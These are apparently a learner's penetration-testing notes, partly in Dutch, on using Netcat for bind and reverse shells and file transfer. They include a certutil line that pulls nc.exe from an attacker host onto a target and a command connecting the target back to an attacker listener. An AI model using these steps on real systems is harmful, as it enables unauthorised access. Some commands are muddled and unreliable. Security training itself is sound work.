#### Bind & reserve shells 

- Netcat is a networking utility used to read and write data to network connections using TCP or UDP
- Netcat is available for both NIX and Windows operating systems, consequently making it extremely useful for cross-platform engagements 
- netcat utilizes a client-server communication architecture with two modules: 
	- **Client mode** - Netcat can be used in client mode to connect to any TCP/UDP port as well as a netcat listener (server)
	- **Server mode** - Netcat can be used to listen for connections from clients on a specific port 
- Netcat can be used by penetration testers to perform the following functionality: 
	- Banner grabbing 
	- Port scanning 
	- Transferring Files 
	- Bind/reverse shells 
- netcat manual: `man nc `




##### Setting up the Listener
connect to port: `nc target_ip target_port `
- `-nv`: no dns resolution and verbose output 
- `-nvu`: connect to udp port instead of tcp

1 set up listener - two ways to do this: 
	Set up webserver and download the file from the target host's browser 
	-  `python -m SimpleHTTPServer 80 `
	-  open browser and visit the webserver url: `http://kali-ip:80 ``
	Set up webserver and download the file from the target command prompt 
	- navigate to directory where I want to save the file `cd`
	- `certutil -urlcache -f http://kali_ip/nc.exe `

2 set up listener: `nc -nvlp 1234` 
3 connect to listener (in command prompt on target desktop): `nc.exe -nv kali-ip  port `

Als je via target system de listner wil start dan run je daar in de commandprompt `nc -nvlp kali_ip port` en run je in je kali terminal `nc -nv target-ip port `

--

1. Establishing a listener on the attacker's system.
2. Connecting to the listener from the target system.

Step 1: Setting up the Listener
There are two ways to set up a listener on the attacker's system. 

**Method 1:** Set up a Webserver to Download the File from the Target Host's Browser

- Open a terminal on your Kali Linux machine.
- Run the following command to start a simple webserver on port 80:
	- `python -m SimpleHTTPServer 80`
- Open a web browser on the target system and visit the following URL:
	- `http://kali-ip:80`
    Replace "kali-ip" with the IP address of your Kali Linux machine.

**Method 2**: Set up a Webserver to Download the File from the Target Command Prompt
-  Open a terminal on your Kali Linux machine.
	- Navigate to the directory where you want to save the file.
		- `cd /path/to/save/location/`
    
- Run the following command to download the nc.exe file from your Kali Linux machine:
	- `certutil -urlcache -f http://kali_ip/nc.exe`
    
    Replace "kali_ip" with the IP address of your Kali Linux machine.

Step 2: Setting up the Listener on the Attacker's System

- Open a terminal on your Kali Linux machine.
- Run the following command to set up a Netcat listener on port 1234:
	- `nc -nvlp 1234`
    

Step 3: Connecting to the Listener from the Target System (Windows)
- Open a command prompt on the target system (Windows).
- Navigate to the directory where you downloaded the nc.exe file (if needed).
- Run the following command to connect to the Netcat listener on your Kali Linux machine:
	- `nc.exe -nv kali-ip 1234`
  

Note:
- If you wish to start the listener from the target system, run the following command in the target system's command prompt: `nc -nvlp kali_ip 1234`

And in your Kali terminal, run: `nc -nv target-ip 1234` 
    Replace "kali_ip" with the IP address of your Kali Linux machine and "target-ip" with the IP address of the target system.

`nc -nv` wordt gebruikt om om een actieve verbinding tot stand te brengen, terwijl `nc -nvlp` gebruikt wordt te luisteren naar inkomende verbindingen 

1. `nc -nvlp` (Listening Mode):
    - **-n**: It tells Netcat not to perform DNS resolution, which can speed up connection establishment.
    - **-v**: This option makes Netcat verbose, providing detailed output about the connection.
    - **-l**: This option specifies that Netcat should operate in listening mode, waiting for incoming connections.
    - **-p port**: You would typically specify the port number after `-p` to indicate on which port Netcat should listen for incoming connections. For example, `nc -nvlp 1234` listens on port 1234.

    - This command sets up Netcat to listen on port 1234 and wait for incoming connections. It's commonly used on the system that will receive incoming connections, like a server.
- 
1. `nc -nv` (Connecting Mode):
    - **target_ip target_port**: In this case, you specify the IP address of the target system and the port you want to connect to.
    - This command initiates an active connection to a remote system at `target_ip` on the specified `target_port`. It's used on the system that initiates the connection, often referred to as the client or attacker in some scenarios.

In summary, `nc -nvlp` is used on the system that is waiting for incoming connections (listener), while `nc -nv` is used on the system that initiates the connection to the listener. The listener sets up a server-like environment, while the connecting side acts as the client or attacker.

 netcat listener on udp port:  `nc -nvlup 1234 `  --> `nc -nvu 1234`


##### Setting up listener and connecting to listener (how to transfer files with netcat)


- The system you want to **transfer**/receive the files (to) needs to have the listener (`nc -nvlp`) set up 
- the system that is **sending** the file will be **connecting** to that netcat listener 

